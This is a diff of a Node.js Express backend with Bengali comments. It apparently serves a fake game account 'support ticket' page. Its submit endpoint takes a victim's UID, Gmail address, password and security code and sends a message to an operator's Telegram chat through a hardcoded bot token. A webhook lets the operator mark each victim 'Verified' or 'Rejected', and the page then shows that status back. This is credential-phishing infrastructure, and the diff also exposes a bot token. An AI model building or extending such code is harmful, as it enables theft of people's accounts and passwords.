@@ -1,29 +1,59 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
-app.use(cors());
+
+// CORS সম্পূর্ণ ওপেন করা
+app.use(cors({ origin: '*' }));
 app.use(express.json());
+
+// ক্যাশিং বন্ধ করার হেডার
+app.use((req, res, next) => {
+    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
+    next();
+});
 
 const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
 const TELEGRAM_CHAT_ID = "-1004444318249";
+const DB_FILE = path.join(__dirname, 'database.json');
 
-let userDatabase = {}; 
+// ডাটাবেজ ফাইল রিড করা
+function readDB() {
+    if (!fs.existsSync(DB_FILE)) {
+        fs.writeFileSync(DB_FILE, JSON.stringify({}));
+    }
+    try {
+        const data = fs.readFileSync(DB_FILE, 'utf8');
+        return JSON.parse(data);
+    } catch (e) {
+        return {};
+    }
+}
 
-app.get('/', (req, res) => res.send("Backend Running Successfully!"));
+// ডাটাবেজ ফাইলে সেভ করা
+function writeDB(data) {
+    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
+}
 
-// ১. ফর্ম সাবমিট হলে টেলিগ্রামে পাঠানো
+app.get('/', (req, res) => res.send("Backend Running Cleanly!"));
+
+// ১. ফর্ম সাবমিট API
 app.post('/api/submit-ticket', async (req, res) => {
     const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
     
-    // ইনিশিয়াল স্ট্যাটাস Pending সেট করা
-    userDatabase[uid] = {
+    let db = readDB();
+    db[uid] = {
         status: "Pending",
         name: "Checking Status...",
         level: "Under Review",
         reason: ""
     };
+    writeDB(db);
 
     const telegramMessage = `
 📩 *New Support Ticket Submitted!*
@@ -57,15 +87,16 @@ app.post('/api/submit-ticket', async (req, res) => {
                 ]
             }
         });
-        res.json({ success: true, message: "Sent to Telegram" });
+        res.json({ success: true });
     } catch (error) {
-        console.error("Telegram Error:", error.message);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// ২. টেলিগ্রাম বাটন ক্লিকে রেসপন্স রিসিভ করা (Webhook API)
+// ২. টেলিগ্রাম ওয়েবহুক API
 app.post('/api/telegram-webhook', async (req, res) => {
+    res.sendStatus(200); // টেলিগ্রামকে আগে OK রেসপন্স দেওয়া
+
     try {
         const update = req.body;
 
@@ -80,17 +111,17 @@ app.post('/api/telegram-webhook', async (req, res) => {
             const uid = parts[1];
             const reason = parts[2] || "Information Mismatch";
 
-            let confirmationMsg = "";
+            let db = readDB();
 
             if (action === 'verify') {
-                userDatabase[uid] = {
+                db[uid] = {
                     status: "Verified",
                     name: "Verified Player",
                     level: "Active Account",
                     reason: ""
                 };
+                writeDB(db);
 
-                // মেসেজ এডিট করা
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                     chat_id: chatId,
                     message_id: messageId,
@@ -98,15 +129,20 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     parse_mode: 'Markdown'
                 });
 
-                confirmationMsg = `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status updated to *VERIFIED*!`;
+                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    chat_id: chatId,
+                    text: `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status has been updated to *VERIFIED*!`,
+                    parse_mode: 'Markdown'
+                });
 
             } else if (action === 'reject') {
-                userDatabase[uid] = {
+                db[uid] = {
                     status: "Rejected",
                     name: "Verification Failed",
                     level: "N/A",
                     reason: reason
                 };
+                writeDB(db);
 
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                     chat_id: chatId,
@@ -115,33 +151,28 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     parse_mode: 'Markdown'
                 });
 
-                confirmationMsg = `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` marked as *REJECTED* (${reason})!`;
+                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    chat_id: chatId,
+                    text: `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` has been marked as *REJECTED* (${reason})!`,
+                    parse_mode: 'Markdown'
+                });
             }
 
-            // কনফার্মেশন মেসেজ টেলিগ্রামে পাঠানো
-            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                chat_id: chatId,
-                text: confirmationMsg,
-                parse_mode: 'Markdown'
-            });
-
-            // টেলিগ্রাম বাটন লোডিং বন্ধ করা
             await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                 callback_query_id: callbackQuery.id,
-                text: `UID: ${uid} updated successfully!`
+                text: `UID ${uid} Updated!`
             });
         }
     } catch (err) {
-        console.error("Webhook processing error:", err);
+        console.error("Error processing callback:", err);
     }
-
-    res.sendStatus(200);
 });
 
-// ৩. ওয়েবসাইট থেকে স্ট্যাটাস চেক করা API
+// ৩. লাইভ স্ট্যাটাস চেক API
 app.get('/api/check-status/:uid', (req, res) => {
     const uid = req.params.uid;
-    const userData = userDatabase[uid] || {
+    const db = readDB();
+    const userData = db[uid] || {
         status: "Pending",
         name: "Checking Status...",
         level: "Under Review",
